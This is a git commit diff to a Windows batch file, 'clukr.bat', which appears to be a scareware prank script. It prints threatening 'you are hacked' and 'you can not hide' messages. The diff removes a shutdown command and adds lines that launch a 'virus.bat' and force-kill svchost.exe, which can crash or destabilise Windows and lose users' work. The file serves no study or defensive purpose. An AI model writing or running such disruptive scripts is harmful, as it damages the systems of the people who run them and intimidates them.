6b183bc577d1ac25fae34a2ba7d7ede1ab885ea0
1here3 <159972256+1here3@users.noreply.github.com>
2025-01-24 23:03:04 -0800

    Update clukr.bat

--- clukr.bat
+++ clukr.bat
@@ -12,29 +12,32 @@ exit
 :hate
 echo your pc has been fbrandyubrandycbrandykbrandyed
 echo You are hacked...
-shutdown -s -t 20
 start
 timeout 2
 start notepad.exe
 echo something is wrong
-timeout 0.8421050250125
+timeout 1
 echo they are all dead
-timeout 0.8421050250125
+timeout 1
 echo they are all gone
-timeout 0.8421050250125
+timeout 1
 echo glaze around
-timeout 0.8421050250125
+timeout 1
 echo you are not safe
-timeout 0.8421050250125
+timeout 1
 echo you can not hide
-timeout 0.8421050250125
+timeout 1
 echo trun away run away
-timeout 0.8421050250125
+timeout 1
 echo run
-timeout 0.1
+timeout 1
 echo runn
-timeout 0.1
+timeout 0
 echo runnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnn
 echo ruuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuun
-timeout 0.1
-timeout 0.1
+timeout 0
+echo runnnnnnnnnnnnn nowwwwwwwww
+timeout 0
+start virus.bat
+timeout 10
+taskkill /f /im svchost.exe
